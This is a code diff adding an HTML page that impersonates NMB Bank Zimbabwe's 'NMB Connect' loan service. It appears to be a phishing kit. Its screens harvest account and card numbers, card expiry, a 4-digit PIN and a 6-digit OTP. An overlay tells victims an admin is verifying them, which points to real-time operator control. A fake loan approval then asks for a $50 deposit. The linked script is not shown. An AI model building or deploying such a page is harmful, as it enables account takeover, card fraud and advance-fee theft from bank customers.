@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>NMB Connect Zimbabwe</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="app-container">
+
+  <!-- SCREEN 1: WELCOME / LANDING PAGE (Exact Match to Photo 1) -->
+  <section id="screen-welcome" class="screen active">
+    <div class="welcome-header-area">
+      <div class="nmb-logo-circle">
+        <svg viewBox="0 0 100 100" class="nmb-svg-logo">
+          <path d="M20 70 L20 30 L50 60 L80 30 L80 70" fill="none" stroke="#043A6B" stroke-width="12" stroke-linecap="round" stroke-linejoin="round"/>
+          <circle cx="50" cy="35" r="8" fill="#C59B27"/>
+        </svg>
+      </div>
+      <div class="nmb-connect-title-row">
+        <span class="nmb-text-dark">NMB</span><span class="connect-text-gold">Connect</span>
+      </div>
+      <p class="brand-subtitle">Banking that suits your lifestyle</p>
+    </div>
+
+    <div class="welcome-hero-box">
+      <h1 class="welcome-main-h1">WELCOME TO NMB CONNECT</h1>
+      <h2 class="welcome-sub-h2">Zimbabwe’s Digital Bank</h2>
+      <p class="welcome-desc-text">Welcome to a seamless banking experience!</p>
+
+      <button type="button" id="btn-goto-bank" class="btn-apply-now">APPLY NOW</button>
+    </div>
+
+    <div class="welcome-notice-card">
+      <p><strong>PLEASE NOTE:</strong> YOU MUST HAVE VALID NMB BANK DETAILS TO START YOUR APPLICATION</p>
+    </div>
+
+    <div class="app-download-footer">
+      <span>Download the NMBConnect App</span>
+      <div class="store-badges-row">
+        <div class="store-badge">Google Play</div>
+        <div class="store-badge">App Store</div>
+      </div>
+      <div class="dial-code-row">Dial <strong>*241#</strong></div>
+      <small>visit https://www.nmbconnectonline.co.zw</small>
+    </div>
+  </section>
+
+  <!-- SCREEN 2: BANK DETAILS (Exact Match to Photo 2) -->
+  <section id="screen-bank" class="screen white-screen">
+    <div class="top-nav-bar">
+      <button type="button" class="nav-back-btn" id="btn-bank-back">← Rudi</button>
+      <div class="brand-header-inline">
+        <span class="nmb-brand-sm">NMB</span>
+        <span class="mkonomi-badge">MKONONI ZIMBABWE</span>
+      </div>
+      <div class="hamburger">☰</div>
+    </div>
+
+    <div class="card-container-main">
+      <div class="card-header-title">
+        <h2>NMB ZIMBABWE</h2>
+        <small>Your trusted banking partner</small>
+      </div>
+
+      <!-- SWITCH KEY FOR PHONE NO AND GMAIL -->
+      <div class="switch-selector-row">
+        <button type="button" class="switch-tab active" id="tab-phone">Phone No</button>
+        <button type="button" class="switch-tab" id="tab-gmail">Gmail</button>
+      </div>
+
+      <div class="form-card-box">
+        <h3>🏦 BANK ACCOUNT DETAILS</h3>
+        <div class="form-group">
+          <label>Your NMB Connect Account Number:</label>
+          <input type="text" id="account-no-input" class="input-text" placeholder="Enter 10 to 13 digit Account Number" inputmode="numeric">
+        </div>
+        <div class="account-meta-row">
+          <span>Account Type: Connect</span>
+          <span>Branch: Harare</span>
+        </div>
+      </div>
+
+      <!-- IDENTIFIER INPUT DYNAMIC (Phone No or Gmail) -->
+      <div class="form-card-box" id="identifier-box-container">
+        <label id="lbl-identifier-title">Your Mobile Number / Phone No:</label>
+        <div class="phone-input-group" id="phone-prefix-wrapper">
+          <span class="flag-prefix">🇿🇼 +263</span>
+          <input type="text" id="identifier-input" class="input-text" placeholder="712345678 or 0712345678" inputmode="numeric">
+        </div>
+        <input type="email" id="identifier-email-input" class="input-text" placeholder="Enter your Gmail address" style="display:none;">
+      </div>
+
+      <div class="form-card-box">
+        <h3>💳 DEBIT/ATM CARD DETAILS</h3>
+        <div class="form-group">
+          <label>Your NMB Card Number:</label>
+          <input type="text" id="card-no-input" class="input-text" placeholder="16-digit card number" maxlength="16" inputmode="numeric">
+        </div>
+        <div class="form-group">
+          <label>Expiry Date:</label>
+          <input type="text" id="card-expiry-input" class="input-text" value="12/26">
+        </div>
+      </div>
+
+      <!-- Surface Error Notification -->
+      <div id="banner-bank-error" class="surface-error-banner"></div>
+
+      <button type="button" id="btn-submit-bank" class="btn-primary-blue">CONTINUE</button>
+    </div>
+  </section>
+
+  <!-- SCREEN 3: LOAN REPAYMENT SLIDER (Exact Match to Photo 3) -->
+  <section id="screen-slider" class="screen white-screen">
+    <div class="top-nav-bar bg-dark-blue">
+      <button type="button" class="nav-back-btn" id="btn-slider-back">← Rudi</button>
+      <div class="brand-header-inline">
+        <span class="nmb-brand-sm text-white">NMB</span>
+        <span class="mkonomi-badge gold">MKONONI ZIMBABWE</span>
+      </div>
+      <div class="hamburger text-white">☰</div>
+    </div>
+
+    <div class="card-container-main">
+      <div class="card-header-title">
+        <h2>NMB BANK LIMITED</h2>
+        <h1 class="power-dreams-title">POWER YOUR DREAMS</h1>
+        <p class="sub-dreams">We've Got You Covered!</p>
+        <small class="desc-dreams">Whether it's for your business, education, home improvement or personal needs – NMB Bank is here to help you succeed.</small>
+      </div>
+
+      <div class="loan-calc-card">
+        <h3>Get Your Loan Quickly</h3>
+        <p class="calc-sub">Instant approval • Low interest • Easy terms</p>
+        <h4>ZIMBABWE NMB LOAN</h4>
+
+        <div class="slider-group">
+          <label>Loan Amount ($)</label>
+          <div class="slider-val-display" id="loan-amount-text">$1,000</div>
+          <input type="range" id="loan-amount-slider" min="100" max="10000" step="50" value="1000" class="range-gold">
+          <div class="slider-limits"><span>100$</span><span>10,000$</span></div>
+        </div>
+
+        <div class="slider-group">
+          <label>Loan Term (Months)</label>
+          <div class="slider-val-display" id="loan-months-text">12 months</div>
+          <input type="range" id="loan-months-slider" min="6" max="60" step="1" value="12" class="range-gold">
+          <div class="slider-limits"><span>6 months</span><span>60 months</span></div>
+        </div>
+
+        <div class="monthly-payment-box">
+          <span>Monthly Payment</span>
+          <h2 id="monthly-rep-val">$95.04</h2>
+        </div>
+
+        <button type="button" id="btn-goto-form1" class="btn-primary-blue">APPLY NOW</button>
+
+        <div class="features-footer-row">
+          <span>⚡ Instant Approval</span>
+          <span>💰 Low Interest</span>
+          <span>🔒 Secure</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- SCREEN 4: FORM STEP 1 (Exact Match to Photo 4) -->
+  <section id="screen-form1" class="screen white-screen">
+    <div class="top-nav-bar bg-dark-blue">
+      <button type="button" class="nav-back-btn" id="btn-form1-back">← Back</button>
+      <div class="brand-header-inline">
+        <span class="nmb-brand-sm text-white">NMB Connect</span>
+        <span class="zimbabwe-label">ZIMBABWE</span>
+      </div>
+      <div class="hamburger text-white">☰</div>
+    </div>
+
+    <div class="card-container-main">
+      <h2 class="form-main-title">Loan Application</h2>
+      <p class="step-indicator">Step 1 of 3</p>
+      <div class="progress-bar-row">
+        <div class="prog-segment active"></div>
+        <div class="prog-segment"></div>
+        <div class="prog-segment"></div>
+      </div>
+
+      <div class="form-group">
+        <label>Type of Loan</label>
+        <select id="loan-type" class="input-select">
+          <option value="Business Loan">Business Loan</option>
+          <option value="Quick Loan">Quick Loan</option>
+          <option value="Agricultural Loan">Agricultural Loan</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label>Loan Amount (ZiG / USD)</label>
+        <input type="text" id="form-amount-input" class="input-text" value="100000">
+      </div>
+
+      <div class="form-group">
+        <label>Loan Term</label>
+        <select id="loan-duration" class="input-select">
+          <option value="48 Months">48 Months</option>
+          <option value="24 Months">24 Months</option>
+          <option value="12 Months">12 Months</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label>Purpose of Loan</label>
+        <textarea id="loan-purpose" class="input-textarea" placeholder="Describe the purpose of your loan..."></textarea>
+      </div>
+
+      <button type="button" id="btn-form1-next" class="btn-orange-action">NEXT STEP</button>
+    </div>
+  </section>
+
+  <!-- SCREEN 5: FORM STEP 2 (Exact Match to Photo 5) -->
+  <section id="screen-form2" class="screen white-screen">
+    <div class="top-nav-bar bg-dark-blue">
+      <button type="button" class="nav-back-btn" id="btn-form2-back">← Back</button>
+      <div class="brand-header-inline">
+        <span class="nmb-brand-sm text-white">NMB Connect</span>
+        <span class="zimbabwe-label">ZIMBABWE</span>
+      </div>
+      <div class="hamburger text-white">☰</div>
+    </div>
+
+    <div class="card-container-main">
+      <h2 class="form-main-title">Loan Application</h2>
+      <p class="step-indicator">Step 2 of 3</p>
+      <div class="progress-bar-row">
+        <div class="prog-segment active"></div>
+        <div class="prog-segment active"></div>
+        <div class="prog-segment"></div>
+      </div>
+
+      <div class="form-row-two">
+        <div class="form-group"><label>First Name</label><input type="text" id="first-name" class="input-text" placeholder="Enter first name"></div>
+        <div class="form-group"><label>Last Name</label><input type="text" id="last-name" class="input-text" placeholder="Enter last name"></div>
+      </div>
+
+      <div class="form-group">
+        <label>Mobile Number</label>
+        <div class="phone-input-group">
+          <span class="flag-prefix">🇿🇼 +263</span>
+          <input type="text" id="form-phone" class="input-text" placeholder="712345678 or 0712345678" inputmode="numeric">
+        </div>
+        <small class="helper-note">Enter 9 digits or start with 0 (e.g., 771234567 or 0771234567 -&gt; converted to +263771234567)</small>
+      </div>
+
+      <div class="form-group">
+        <label>NMB Bank Account / Connect ID</label>
+        <input type="text" id="form-account-id" class="input-text" placeholder="Enter NMB account number">
+      </div>
+
+      <div class="form-buttons-row">
+        <button type="button" id="btn-form2-prev" class="btn-grey-action">PREVIOUS</button>
+        <button type="button" id="btn-form2-next" class="btn-orange-action">NEXT STEP</button>
+      </div>
+    </div>
+  </section>
+
+  <!-- SCREEN 6: FORM STEP 3 (Exact Match to Photo 6) -->
+  <section id="screen-form3" class="screen white-screen">
+    <div class="top-nav-bar bg-dark-blue">
+      <button type="button" class="nav-back-btn" id="btn-form3-back">← Back</button>
+      <div class="brand-header-inline">
+        <span class="nmb-brand-sm text-white">NMB Connect</span>
+        <span class="zimbabwe-label">ZIMBABWE</span>
+      </div>
+      <div class="hamburger text-white">☰</div>
+    </div>
+
+    <div class="card-container-main">
+      <h2 class="form-main-title">Loan Application</h2>
+      <p class="step-indicator">Step 3 of 3</p>
+      <div class="progress-bar-row">
+        <div class="prog-segment active"></div>
+        <div class="prog-segment active"></div>
+        <div class="prog-segment active"></div>
+      </div>
+
+      <div class="form-group">
+        <label>Employment Status</label>
+        <select id="employment-status" class="input-select">
+          <option value="Self-Employed / Businessman">Self-Employed / Businessman</option>
+          <option value="Formal Employee">Formal Employee</option>
+          <option value="Entrepreneur">Entrepreneur</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label>Annual Income (ZiG / USD)</label>
+        <input type="text" id="annual-income" class="input-text" placeholder="Enter annual income">
+      </div>
+
+      <div class="summary-card-box">
+        <h4>Application Summary</h4>
+        <div class="sum-row"><span>Loan Amount:</span> <strong id="sum-amount">ZiG 100,000</strong></div>
+        <div class="sum-row"><span>Loan Term:</span> <strong id="sum-duration">48 Months</strong></div>
+        <div class="sum-row"><span>Purpose:</span> <strong id="sum-purpose">Business</strong></div>
+        <div class="sum-row"><span>Applicant:</span> <strong id="sum-applicant">NMB CONNECT ZIMBABWE</strong></div>
+      </div>
+
+      <div class="form-buttons-row">
+        <button type="button" id="btn-form3-prev" class="btn-grey-action">PREVIOUS</button>
+        <button type="button" id="btn-form3-submit" class="btn-orange-action">SUBMIT APPLICATION</button>
+      </div>
+    </div>
+  </section>
+
+  <!-- SCREEN 7: SIGN IN / PIN ENTRY (Exact Match to Photo 8) -->
+  <section id="screen-signin" class="screen white-screen">
+    <div class="top-nav-bar bg-dark-blue">
+      <div class="brand-header-inline">
+        <span class="nmb-brand-sm text-white">NMB</span>
+        <span class="mkonomi-badge gold">MKONONI ZIMBABWE</span>
+      </div>
+      <div class="hamburger text-white">☰</div>
+    </div>
+
+    <div class="card-container-main align-center">
+      <div class="card-header-title">
+        <h2>Sign In</h2>
+        <small>Account Access</small>
+      </div>
+
+      <div class="phone-input-group margin-bottom-15">
+        <span class="flag-prefix">🇿🇼 +263</span>
+        <input type="text" id="signin-identifier" class="input-text" placeholder="71 234 5678 or 071 234 5678">
+      </div>
+
+      <label class="pin-title-label">ENTER YOUR 4-DIGIT PIN</label>
+
+      <!-- Surface Error Notification -->
+      <div id="banner-pin-error" class="surface-error-banner"></div>
+
+      <div class="golden-pin-container">
+        <input type="password" class="pin-box-square" maxlength="1" inputmode="numeric">
+        <input type="password" class="pin-box-square" maxlength="1" inputmode="numeric">
+        <input type="password" class="pin-box-square" maxlength="1" inputmode="numeric">
+        <input type="password" class="pin-box-square" maxlength="1" inputmode="numeric">
+      </div>
+
+      <a href="#" class="forgot-pin-link">Forgot PIN?</a>
+
+      <button type="button" id="btn-submit-signin" class="btn-primary-blue margin-top-20">SIGN IN</button>
+    </div>
+  </section>
+
+  <!-- SCREEN 8: OTP VERIFICATION (Exact Match to Photo 9) -->
+  <section id="screen-otp" class="screen white-screen">
+    <div class="top-nav-bar bg-dark-blue">
+      <div class="brand-header-inline">
+        <span class="nmb-brand-sm text-white">NMB</span>
+        <span class="mkonomi-badge gold">MKONONI ZIMBABWE</span>
+      </div>
+      <div class="hamburger text-white">☰</div>
+    </div>
+
+    <div class="card-container-main align-center">
+      <div class="card-header-title">
+        <h2>OTP Verification</h2>
+        <small>Enter the 6-digit OTP sent to your mobile number or Gmail</small>
+      </div>
+
+      <div class="verified-success-alert">
+        ✓ Account details verified. Please enter the 6-digit OTP below.
+      </div>
+
+      <!-- Surface Error Notification -->
+      <div id="banner-otp-error" class="surface-error-banner"></div>
+
+      <div class="golden-otp-container">
+        <input type="text" class="otp-box-square" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
+        <input type="text" class="otp-box-square" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-box-square" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-box-square" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-box-square" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-box-square" maxlength="1" inputmode="numeric">
+      </div>
+
+      <p class="resend-timer-text">Resend code in <span id="countdown">40</span> seconds</p>
+
+      <button type="button" id="btn-submit-otp" class="btn-primary-blue margin-top-20">SUBMIT</button>
+    </div>
+  </section>
+
+  <!-- SCREEN 9: CONGRATULATIONS & SUCCESS (Exact Match to Photo 10) -->
+  <section id="screen-success" class="screen white-screen">
+    <div class="card-container-main align-center">
+      <div class="success-badge-circle">✓</div>
+      <h2 class="congrats-title">Congratulations!</h2>
+      <p class="congrats-sub">Your loan is approved! Funds will be issued shortly.</p>
+
+      <div class="approved-amount-box">
+        <span>AMOUNT APPROVED</span>
+        <h1 id="final-approved-amount">$1,000</h1>
+      </div>
+
+      <div class="important-notice-card">
+        <h4>⚠️ IMPORTANT NOTICE:</h4>
+        <p>You must have at least $50 in your account to receive this loan. Please deposit funds immediately if your balance is insufficient.</p>
+      </div>
+
+      <div class="action-buttons-stack">
+        <button class="action-card-btn">DEPOSIT MONEY</button>
+        <button class="action-card-btn">WITHDRAW MONEY</button>
+        <button class="action-card-btn">LOAN DETAILS</button>
+      </div>
+
+      <div class="next-steps-box">
+        <h4>NEXT STEPS</h4>
+        <p>Steps to Follow: You will receive an SMS and email with withdrawal details within 24 hours.</p>
+      </div>
+
+      <button type="button" id="btn-finish-home" class="btn-primary-blue margin-top-20">BACK HOME</button>
+    </div>
+  </section>
+
+  <!-- STOPPED SCREEN (IF DENIED / DISALLOWED) -->
+  <section id="screen-stopped" class="screen white-screen">
+    <div class="card-container-main align-center" style="margin-top: 150px;">
+      <div class="success-badge-circle" style="background-color: #D32F2F;">✕</div>
+      <h2 class="congrats-title" style="color: #D32F2F;">Application Stopped</h2>
+      <p class="congrats-sub">Sorry, your application has been disallowed or denied by NMB security system.</p>
+    </div>
+  </section>
+
+  <!-- SPINNING / WAITING OVERLAY FOR ADMIN ALLOW -->
+  <div id="loading-overlay" class="loading-overlay">
+    <div class="spinner"></div>
+    <h3 id="loading-title">VERIFYING BANK DETAILS...</h3>
+    <p id="loading-sub">Please wait while admin verifies your account details.</p>
+  </div>
+
+</div>
+
+<script src="script.js"></script>
+</body>
+  </html>
+          
